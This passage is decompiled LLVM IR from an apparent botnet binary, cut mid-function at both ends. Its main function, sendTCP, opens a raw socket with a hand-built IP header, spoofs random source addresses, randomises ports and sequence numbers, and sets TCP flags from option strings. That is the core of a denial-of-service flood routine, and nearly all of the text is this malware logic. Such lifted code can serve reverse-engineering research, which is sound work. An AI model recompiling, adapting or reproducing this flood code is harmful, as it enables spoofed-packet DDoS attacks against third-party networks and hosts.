  %v1_804b7c0 = sext i32 %v4_804b792 to i64
  %v2_804b7c0 = call i32 @usleep(i64 %v1_804b7c0)
  store i32 %v2_804b7c0, i32* %eax.global-to-local, align 4
  %v0_804b7c5 = load i32, i32* @esp, align 4
  %v1_804b7c5 = add i32 %v0_804b7c5, 16
  br label %dec_label_pc_804b6b9.outer

dec_label_pc_804b7d4:                             ; preds = %dec_label_pc_804b792
  %v4_804b7d4 = add i32 %stack_var_-80.0.ph, 1
  %v0_804b6bf.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b6b9.outer

dec_label_pc_804b7dc:                             ; preds = %dec_label_pc_804b774, %dec_label_pc_804b4ee, %dec_label_pc_804b4ca
  %v0_804b7e532 = phi i32 [ %v5_804b505, %dec_label_pc_804b4ee ], [ %v3_804b4d8, %dec_label_pc_804b4ca ], [ %v3_804b779, %dec_label_pc_804b774 ]
  br label %dec_label_pc_804b7df

dec_label_pc_804b7df:                             ; preds = %dec_label_pc_804b461, %dec_label_pc_804b3cd, %dec_label_pc_804b3af, %dec_label_pc_804b36f, %dec_label_pc_804b7dc
  %v0_804b7e5 = phi i32 [ 0, %dec_label_pc_804b3cd ], [ 0, %dec_label_pc_804b3af ], [ %v3_804b37c, %dec_label_pc_804b36f ], [ %v0_804b7e532, %dec_label_pc_804b7dc ], [ %v2_804b466, %dec_label_pc_804b461 ]
  store i32 %v0_804b33c, i32* @ebx, align 4
  ret i32 %v0_804b7e5

; uselistorder directives
  uselistorder i32 %v4_804b792, { 2, 1, 0 }
  uselistorder i32 %v0_804b737, { 1, 0 }
  uselistorder i32 %v1_804b71c, { 1, 0 }
  uselistorder i32 %v1_804b717, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804b6db, { 1, 0 }
  uselistorder i32 %v0_804b6bf, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804b66e, { 1, 0 }
  uselistorder i32 %v4_804b64f, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b6f7.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804b637, { 2, 1, 0 }
  uselistorder i32 %v1_804b61b, { 1, 0 }
  uselistorder i32 %v1_804b5fc, { 1, 0 }
  uselistorder i32 %v2_804b5a0, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804b576, { 1, 0 }
  uselistorder i32 %v3_804b4d8, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 %v4_804b480, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804b4a7, { 1, 0 }
  uselistorder i32 %v1_804b3d5, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804b3d0, { 2, 1, 0, 3 }
  uselistorder i32 %v3_804b3b8, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804b372, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804b35a, { 1, 0 }
  uselistorder i32 %v12_804b33d, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b7df, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804b70c, { 1, 0 }
  uselistorder label %dec_label_pc_804b6b9, { 1, 0 }
  uselistorder label %dec_label_pc_804b6b9.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b64c, { 1, 0 }
  uselistorder label %dec_label_pc_804b57d, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %dec_label_pc_804b51f, { 1, 0 }
  uselistorder label %dec_label_pc_804b461, { 1, 0 }
  uselistorder label %dec_label_pc_804b42d, { 1, 0 }
  uselistorder label %dec_label_pc_804b42d.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b36f, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp46 = call i16 @__decompiler_undefined_function_5()
  %tmp47 = call i32 @__decompiler_undefined_function_0()
  %tmp48 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804b7ea = load i32, i32* @esi, align 4
  %v0_804b7eb = load i32, i32* @ebx, align 4
  %v15_804b7ec = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b803 = icmp eq i32 %arg2, 0
  %v1_804b807 = icmp eq i1 %v4_804b803, false
  br i1 %v1_804b807, label %dec_label_pc_804b814, label %dec_label_pc_804b809

dec_label_pc_804b809:                             ; preds = %entry
  %v1_804b809 = call i32 @rand_cmwc(i32 %v15_804b7ec)
  store i32 %v1_804b809, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b82c

dec_label_pc_804b814:                             ; preds = %entry
  %v1_804b817 = urem i32 %arg2, 65536
  store i32 %v1_804b817, i32* %eax.global-to-local, align 4
  %v5_804b81c = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b81c, i1* %cf.global-to-local, align 1
  %v1_804b820 = call i32 @htons(i32 %v1_804b817)
  store i32 %v1_804b820, i32* %eax.global-to-local, align 4
  %v0_804b825 = load i32, i32* @esp, align 4
  %v2_804b825 = icmp ugt i32 %v0_804b825, -17
  store i1 %v2_804b825, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804b82c

dec_label_pc_804b82c:                             ; preds = %dec_label_pc_804b809, %dec_label_pc_804b814
  %v2_804b82f = ptrtoint i32* %stack_var_-60 to i32
  %v5_804b832 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804b832, i1* %cf.global-to-local, align 1
  %v15_804b832 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804b832, i32* %eax.global-to-local, align 4
  %v3_804b839 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804b839, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b841 = icmp eq i32 %v3_804b839, 0
  br i1 %v1_804b841, label %dec_label_pc_804b84a, label %dec_label_pc_804bd26

dec_label_pc_804b84a:                             ; preds = %dec_label_pc_804b82c
  %v15_804b84d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804b84d, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804b85d = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804b85d, i1* %cf.global-to-local, align 1
  %v3_804b866 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_804b866, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b871 = icmp eq i32 %v3_804b866, 0
  %v1_804b875 = icmp eq i1 %v4_804b871, false
  br i1 %v1_804b875, label %dec_label_pc_804b87c, label %dec_label_pc_804bd26

dec_label_pc_804b87c:                             ; preds = %dec_label_pc_804b84a
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804b883 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b883, i1* %cf.global-to-local, align 1
  %v2_804b888 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804b888, i32* %eax.global-to-local, align 4
  %v5_804b893 = call i32 @__GI_setsockopt(i32 %v3_804b866, i32 0, i32 3, i32 %v2_804b888, i32 4)
  store i32 %v5_804b893, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804b89b = icmp slt i32 %v5_804b893, 0
  %v1_804b89d = icmp eq i1 %v2_804b89b, false
  br i1 %v1_804b89d, label %dec_label_pc_804b8a4, label %dec_label_pc_804bd26

dec_label_pc_804b8a4:                             ; preds = %dec_label_pc_804b87c
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b8a4 = icmp eq i32 %arg4, 0
  %v1_804b8a8 = icmp eq i1 %v4_804b8a4, false
  br i1 %v1_804b8a8, label %dec_label_pc_804b8b3, label %dec_label_pc_804b8c9

dec_label_pc_804b8b3:                             ; preds = %dec_label_pc_804b8a4
  %v5_804b8ba = sub i32 32, %arg4
  %v10_804b8ba = icmp ugt i32 %arg4, 32
  store i1 %v10_804b8ba, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804b8c2 = urem i32 %v5_804b8ba, 32
  %v4_804b8c2 = icmp eq i32 %v2_804b8c2, 0
  br i1 %v4_804b8c2, label %bb101, label %bb

bb:                                               ; preds = %dec_label_pc_804b8b3
  %v5_804b8c2 = shl i32 1, %v2_804b8c2
  store i32 %v5_804b8c2, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb101

bb101:                                            ; preds = %dec_label_pc_804b8b3, %bb
  %v0_804b8c4 = phi i32 [ 1, %dec_label_pc_804b8b3 ], [ %v5_804b8c2, %bb ]
  %v1_804b8c4 = sub i32 0, %v0_804b8c4
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804b8c4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b8c9

dec_label_pc_804b8c9:                             ; preds = %dec_label_pc_804b8a4, %bb101
  %storemerge12 = phi i32 [ %v1_804b8c4, %bb101 ], [ 0, %dec_label_pc_804b8a4 ]
  %v1_804b8cc = add i32 %arg6, 40
  %v1_804b8d8 = add i32 %arg6, 70
  %v2_804b8db = and i32 %v1_804b8d8, -16
  %v2_804b8e1 = sub i32 %v15_804b7ec, %v2_804b8db
  %v1_804b8e9 = add i32 %v2_804b8e1, 15
  %v2_804b8ec = and i32 %v1_804b8e9, -16
  store i32 %v2_804b8ec, i32* %edx.global-to-local, align 4
  %v1_804b904 = add i32 %v2_804b8ec, 20
  %v5_804b907 = inttoptr i32 %v1_804b904 to i16*
  %v1_804b90d = add i32 %arg6, 20
  store i32 %v1_804b90d, i32* %eax.global-to-local, align 4
  store i32 %v1_804b90d, i32* @ebx, align 4
  %v5_804b912 = icmp ult i32 %v2_804b8e1, 12
  store i1 %v5_804b912, i1* %cf.global-to-local, align 1
  %v5_804b915 = add i32 %v2_804b8e1, -16
  %v6_804b915 = inttoptr i32 %v5_804b915 to i32*
  store i32 %storemerge12, i32* %v6_804b915, align 4
  %v2_804b918 = call i32 @GetRandomIP(i32 %v1_804b8cc, i32 %v2_804b8ec)
  store i32 %v2_804b918, i32* %eax.global-to-local, align 4
  %v0_804b91d = load i32, i32* @esp, align 4
  %v1_804b91d = add i32 %v0_804b91d, 16
  %v5_804b920 = icmp ult i32 %v1_804b91d, 12
  store i1 %v5_804b920, i1* %cf.global-to-local, align 1
  %v3_804b923 = inttoptr i32 %v0_804b91d to i32*
  store i32 %v2_804b918, i32* %v3_804b923, align 4
  %v0_804b924 = call i32 @htonl()
  store i32 %v0_804b924, i32* %eax.global-to-local, align 4
  %v0_804b929 = load i32, i32* @esp, align 4
  %v3_804b92c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804b92c, i32* %edx.global-to-local, align 4
  %tmp104 = and i32 %v0_804b929, -4
  %v5_804b92f = icmp eq i32 %tmp104, -16
  store i1 %v5_804b92f, i1* %cf.global-to-local, align 1
  %v0_804b932 = load i32, i32* @ebx, align 4
  %v2_804b932 = add i32 %v0_804b929, 8
  %v3_804b932 = inttoptr i32 %v2_804b932 to i32*
  store i32 %v0_804b932, i32* %v3_804b932, align 4
  %v1_804b933 = add i32 %v0_804b929, 4
  %v2_804b933 = inttoptr i32 %v1_804b933 to i32*
  store i32 6, i32* %v2_804b933, align 4
  %v3_804b935 = inttoptr i32 %v0_804b929 to i32*
  store i32 %v0_804b924, i32* %v3_804b935, align 4
  %v0_804b936 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b936 = add i32 %v0_804b929, -4
  %v3_804b936 = inttoptr i32 %v2_804b936 to i32*
  store i32 %v0_804b936, i32* %v3_804b936, align 4
  %v5_804b937 = add i32 %v0_804b929, -8
  %v6_804b937 = inttoptr i32 %v5_804b937 to i32*
  store i32 %v2_804b8ec, i32* %v6_804b937, align 4
  %v0_804b93a = call i32 @makeIPPacket()
  store i32 %v0_804b93a, i32* %eax.global-to-local, align 4
  %v0_804b93f = load i32, i32* @esp, align 4
  %v5_804b93f = icmp ugt i32 %v0_804b93f, -25
  store i1 %v5_804b93f, i1* %cf.global-to-local, align 1
  %v2_804b942 = call i32 @rand_cmwc(i32 %v1_804b904)
  %sext = mul i32 %v2_804b942, 65536
  %v1_804b947 = sdiv i32 %sext, 65536
  store i32 %v1_804b947, i32* %edx.global-to-local, align 4
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  %v1_804b94c = trunc i32 %v1_804b947 to i16
  store i16 %v1_804b94c, i16* %v5_804b907, align 4
  %v2_804b94f = call i32 @rand_cmwc(i32 %v1_804b904)
  %v2_804b959 = add i32 %v2_804b8ec, 24
  %v3_804b959 = inttoptr i32 %v2_804b959 to i32*
  store i32 %v2_804b94f, i32* %v3_804b959, align 8
  store i32 %v1_804b904, i32* %eax.global-to-local, align 4
  %v1_804b95f = add i32 %v2_804b8ec, 28
  %v2_804b95f = inttoptr i32 %v1_804b95f to i32*
  store i32 0, i32* %v2_804b95f, align 4
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v1_804b969 = add i32 %v2_804b8ec, 32
  %v2_804b969 = inttoptr i32 %v1_804b969 to i8*
  %v3_804b969 = load i8, i8* %v2_804b969, align 16
  %v1_804b96c = urem i8 %v3_804b969, 16
  %v1_804b96f = or i8 %v1_804b96c, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804b96f, i8* %v2_804b969, align 16
  %v4_804b975 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804b975, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804b975, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a50.139 to i32), i32* @edi, align 4
  %v6_804b993 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a50.139, i32 0, i32 0), i32 4)
  %v7_804b993 = urem i32 %v6_804b993, 2
  %v8_804b993 = icmp eq i32 %v7_804b993, 0
  %v0_804b995 = load i1, i1* %cf.global-to-local, align 1
  %v2_804b995 = or i1 %v0_804b995, %v8_804b993
  %v3_804b995 = zext i1 %v2_804b995 to i32
  %v4_804b995 = load i32, i32* %edx.global-to-local, align 4
  %v5_804b995 = and i32 %v4_804b995, -256
  %v6_804b995 = or i32 %v3_804b995, %v5_804b995
  %v7_804b995 = xor i32 %v6_804b995, 1
  store i32 %v7_804b995, i32* @edx, align 4
  %v3_804b99b = and i32 %v6_804b993, -256
  %v1_804b99d = trunc i32 %v7_804b995 to i8
  %v3_804b99d = zext i1 %v0_804b995 to i8
  %v4_804b99d = sub nsw i8 %v1_804b99d, %v3_804b99d
  %v15_804b99d = icmp eq i8 %v4_804b99d, 0
  %v20_804b99d = zext i8 %v4_804b99d to i32
  %v23_804b99d = or i32 %v20_804b99d, %v3_804b99b
  store i32 %v23_804b99d, i32* @ecx, align 4
  %v2_804b9a1 = sext i8 %v4_804b99d to i32
  store i32 %v2_804b9a1, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b9a6 = icmp eq i1 %v15_804b99d, false
  br i1 %v1_804b9a6, label %dec_label_pc_804b9e9, label %dec_label_pc_804b9a8

dec_label_pc_804b9a8:                             ; preds = %dec_label_pc_804b8c9
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v1_804b9ab = add i32 %v2_804b8ec, 33
  %v2_804b9ab = inttoptr i32 %v1_804b9ab to i8*
  %v3_804b9ab = load i8, i8* %v2_804b9ab, align 1
  %v4_804b9ab = zext i8 %v3_804b9ab to i32
  %v6_804b9ab = and i32 %v2_804b9a1, -256
  %v7_804b9ab = or i32 %v6_804b9ab, %v4_804b9ab
  %v1_804b9ae = or i32 %v7_804b9ab, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9ae = trunc i32 %v1_804b9ae to i8
  store i32 %v1_804b9ae, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9ae, i8* %v2_804b9ab, align 1
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v3_804b9b7 = load i8, i8* %v2_804b9ab, align 1
  %v4_804b9b7 = zext i8 %v3_804b9b7 to i32
  %v5_804b9b7 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9b7 = and i32 %v5_804b9b7, -256
  %v7_804b9b7 = or i32 %v4_804b9b7, %v6_804b9b7
  %v1_804b9ba = or i32 %v7_804b9b7, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9ba = trunc i32 %v1_804b9ba to i8
  store i32 %v1_804b9ba, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9ba, i8* %v2_804b9ab, align 1
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v3_804b9c3 = load i8, i8* %v2_804b9ab, align 1
  %v4_804b9c3 = zext i8 %v3_804b9c3 to i32
  %v5_804b9c3 = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9c3 = and i32 %v5_804b9c3, -256
  %v7_804b9c3 = or i32 %v4_804b9c3, %v6_804b9c3
  %v1_804b9c6 = or i32 %v7_804b9c3, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9c6 = trunc i32 %v1_804b9c6 to i8
  store i32 %v1_804b9c6, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9c6, i8* %v2_804b9ab, align 1
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v3_804b9cf = load i8, i8* %v2_804b9ab, align 1
  %v4_804b9cf = zext i8 %v3_804b9cf to i32
  %v5_804b9cf = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9cf = and i32 %v5_804b9cf, -256
  %v7_804b9cf = or i32 %v4_804b9cf, %v6_804b9cf
  %v1_804b9d2 = or i32 %v7_804b9cf, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9d2 = trunc i32 %v1_804b9d2 to i8
  store i32 %v1_804b9d2, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9d2, i8* %v2_804b9ab, align 1
  store i32 %v1_804b904, i32* %edx.global-to-local, align 4
  %v3_804b9db = load i8, i8* %v2_804b9ab, align 1
  %v4_804b9db = zext i8 %v3_804b9db to i32
  %v5_804b9db = load i32, i32* %eax.global-to-local, align 4
  %v6_804b9db = and i32 %v5_804b9db, -256
  %v7_804b9db = or i32 %v4_804b9db, %v6_804b9db
  %v1_804b9de = or i32 %v7_804b9db, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804b9de = trunc i32 %v1_804b9de to i8
  store i32 %v1_804b9de, i32* %eax.global-to-local, align 4
  store i8 %v3_804b9de, i8* %v2_804b9ab, align 1
  %v0_804bb9a.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804bb9a

dec_label_pc_804b9e9:                             ; preds = %dec_label_pc_804b8c9
  store i32 %v4_804b975, i32* @eax, align 4
  %v0_804b9ec = load i32, i32* @esp, align 4
  %v5_804b9ec = icmp ult i32 %v0_804b9ec, 8
  store i1 %v5_804b9ec, i1* %cf.global-to-local, align 1
  %v1_804b9ef = add i32 %v0_804b9ec, -12
  %v2_804b9ef = inttoptr i32 %v1_804b9ef to i32*
  store i32 ptrtoint (i32* @global_var_8055a54.140 to i32), i32* %v2_804b9ef, align 4
  %v0_804b9f4 = load i32, i32* @eax, align 4
  %v2_804b9f4 = add i32 %v0_804b9ec, -16
  %v3_804b9f4 = inttoptr i32 %v2_804b9f4 to i32*
  store i32 %v0_804b9f4, i32* %v3_804b9f4, align 4
  %v3_804b9f5 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8055a50.139 to i32))
  store i32 %v3_804b9f5, i32* %eax.global-to-local, align 4
  %v5_804b9fd = inttoptr i32 %v3_804b9f5 to i8*
  store i8* %v5_804b9fd, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bb9021 = icmp eq i32 %v3_804b9f5, 0
  %v1_804bb9428 = icmp eq i1 %v5_804bb9021, false
  br i1 %v1_804bb9428, label %dec_label_pc_804ba05.lr.ph, label %dec_label_pc_804bb9a

dec_label_pc_804ba05.lr.ph:                       ; preds = %dec_label_pc_804b9e9
  %v1_804bb72 = add i32 %v2_804b8ec, 33
  %v2_804bb72 = inttoptr i32 %v1_804bb72 to i8*
  %tmp102 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804ba05

dec_label_pc_804ba05:                             ; preds = %dec_label_pc_804ba05.lr.ph, %dec_label_pc_804bb7b
  %v3_804bb2a = phi i8* [ %v5_804b9fd, %dec_label_pc_804ba05.lr.ph ], [ %tmp103, %dec_label_pc_804bb7b ]
  %stack_var_-156.130 = phi i8* [ %tmp48, %dec_label_pc_804ba05.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804bb7b ]
  %stack_var_-160.129 = phi i32 [ %tmp47, %dec_label_pc_804ba05.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804bb7b ]
  %v4_804ba05 = ptrtoint i8* %v3_804bb2a to i32
  store i32 %v4_804ba05, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba05, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a56.141 to i32), i32* @edi, align 4
  %v6_804ba23 = call i32 @_strncmp(i8* %v3_804bb2a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a56.141, i32 0, i32 0), i32 4)
  %v7_804ba23 = urem i32 %v6_804ba23, 2
  %v8_804ba23 = icmp eq i32 %v7_804ba23, 0
  %v0_804ba25 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba25 = or i1 %v0_804ba25, %v8_804ba23
  %v3_804ba25 = zext i1 %v2_804ba25 to i32
  %v4_804ba25 = load i32, i32* @edx, align 4
  %v5_804ba25 = and i32 %v4_804ba25, -256
  %v6_804ba25 = or i32 %v3_804ba25, %v5_804ba25
  %v7_804ba25 = xor i32 %v6_804ba25, 1
  store i32 %v7_804ba25, i32* %edx.global-to-local, align 4
  %v3_804ba2b = and i32 %v6_804ba23, -256
  %v1_804ba2d = trunc i32 %v7_804ba25 to i8
  %v3_804ba2d = zext i1 %v0_804ba25 to i8
  %v4_804ba2d = sub nsw i8 %v1_804ba2d, %v3_804ba2d
  %v15_804ba2d = icmp eq i8 %v4_804ba2d, 0
  %v20_804ba2d = zext i8 %v4_804ba2d to i32
  %v23_804ba2d = or i32 %v20_804ba2d, %v3_804ba2b
  store i32 %v23_804ba2d, i32* @ecx, align 4
  %v2_804ba31 = sext i8 %v4_804ba2d to i32
  store i32 %v2_804ba31, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba36 = icmp eq i1 %v15_804ba2d, false
  br i1 %v1_804ba36, label %dec_label_pc_804ba49, label %dec_label_pc_804ba38

dec_label_pc_804ba38:                             ; preds = %dec_label_pc_804ba05
  store i32 %v1_804b904, i32* @eax, align 4
  %v3_804ba3b = load i8, i8* %v2_804bb72, align 1
  %v4_804ba3b = zext i8 %v3_804ba3b to i32
  %v7_804ba3b = or i32 %v5_804ba25, %v4_804ba3b
  %v1_804ba3e = or i32 %v7_804ba3b, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba3e = trunc i32 %v1_804ba3e to i8
  store i32 %v1_804ba3e, i32* @edx, align 4
  store i8 %v3_804ba3e, i8* %v2_804bb72, align 1
  br label %dec_label_pc_804bb7b

dec_label_pc_804ba49:                             ; preds = %dec_label_pc_804ba05
  store i32 %v4_804ba05, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba05, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a5a.142 to i32), i32* @edi, align 4
  %v6_804ba67 = call i32 @_strncmp(i8* %v3_804bb2a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a5a.142, i32 0, i32 0), i32 4)
  %v7_804ba67 = urem i32 %v6_804ba67, 2
  %v8_804ba67 = icmp eq i32 %v7_804ba67, 0
  %v0_804ba69 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba69 = or i1 %v0_804ba69, %v8_804ba67
  %v3_804ba69 = zext i1 %v2_804ba69 to i32
  %v4_804ba69 = load i32, i32* %edx.global-to-local, align 4
  %v5_804ba69 = and i32 %v4_804ba69, -256
  %v6_804ba69 = or i32 %v3_804ba69, %v5_804ba69
  %v7_804ba69 = xor i32 %v6_804ba69, 1
  store i32 %v7_804ba69, i32* %edx.global-to-local, align 4
  %v3_804ba6f = and i32 %v6_804ba67, -256
  %v1_804ba71 = trunc i32 %v7_804ba69 to i8
  %v3_804ba71 = zext i1 %v0_804ba69 to i8
  %v4_804ba71 = sub nsw i8 %v1_804ba71, %v3_804ba71
  %v15_804ba71 = icmp eq i8 %v4_804ba71, 0
  %v20_804ba71 = zext i8 %v4_804ba71 to i32
  %v23_804ba71 = or i32 %v20_804ba71, %v3_804ba6f
  store i32 %v23_804ba71, i32* @ecx, align 4
  %v2_804ba75 = sext i8 %v4_804ba71 to i32
  store i32 %v2_804ba75, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba7a = icmp eq i1 %v15_804ba71, false
  br i1 %v1_804ba7a, label %dec_label_pc_804ba8d, label %dec_label_pc_804ba7c

dec_label_pc_804ba7c:                             ; preds = %dec_label_pc_804ba49
  store i32 %v1_804b904, i32* @eax, align 4
  %v3_804ba7f = load i8, i8* %v2_804bb72, align 1
  %v4_804ba7f = zext i8 %v3_804ba7f to i32
  %v7_804ba7f = or i32 %v5_804ba69, %v4_804ba7f
  %v1_804ba82 = or i32 %v7_804ba7f, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba82 = trunc i32 %v1_804ba82 to i8
  store i32 %v1_804ba82, i32* @edx, align 4
  store i8 %v3_804ba82, i8* %v2_804bb72, align 1
  br label %dec_label_pc_804bb7b

dec_label_pc_804ba8d:                             ; preds = %dec_label_pc_804ba49
  store i32 %v4_804ba05, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba05, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8055a5e.143 to i32), i32* @edi, align 4
  %v6_804bab1 = call i32 @_strncmp(i8* %v3_804bb2a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8055a5e.143, i32 0, i32 0), i32 4)
  %v7_804bab1 = urem i32 %v6_804bab1, 2
  %v8_804bab1 = icmp eq i32 %v7_804bab1, 0
  %v0_804bab3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bab3 = or i1 %v0_804bab3, %v8_804bab1
  %v3_804bab3 = zext i1 %v2_804bab3 to i32
  %v4_804bab3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bab3 = and i32 %v4_804bab3, -256
  %v6_804bab3 = or i32 %v3_804bab3, %v5_804bab3
  %v7_804bab3 = xor i32 %v6_804bab3, 1
  store i32 %v7_804bab3, i32* %edx.global-to-local, align 4
  %v3_804bab9 = and i32 %v6_804bab1, -256
  %v1_804babb = trunc i32 %v7_804bab3 to i8
  %v3_804babb = zext i1 %v0_804bab3 to i8
  %v4_804babb = sub nsw i8 %v1_804babb, %v3_804babb
  %v15_804babb = icmp eq i8 %v4_804babb, 0
  %v20_804babb = zext i8 %v4_804babb to i32
  %v23_804babb = or i32 %v20_804babb, %v3_804bab9
  store i32 %v23_804babb, i32* @ecx, align 4
  %v2_804babf = sext i8 %v4_804babb to i32
  store i32 %v2_804babf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bac4 = icmp eq i1 %v15_804babb, false
  br i1 %v1_804bac4, label %dec_label_pc_804bad7, label %dec_label_pc_804bac6

dec_label_pc_804bac6:                             ; preds = %dec_label_pc_804ba8d
  store i32 %v1_804b904, i32* @eax, align 4
  %v3_804bac9 = load i8, i8* %v2_804bb72, align 1
  %v4_804bac9 = zext i8 %v3_804bac9 to i32
  %v7_804bac9 = or i32 %v5_804bab3, %v4_804bac9
  %v1_804bacc = or i32 %v7_804bac9, 1
  store i1 false, i1* %cf.global-to-local, align 1
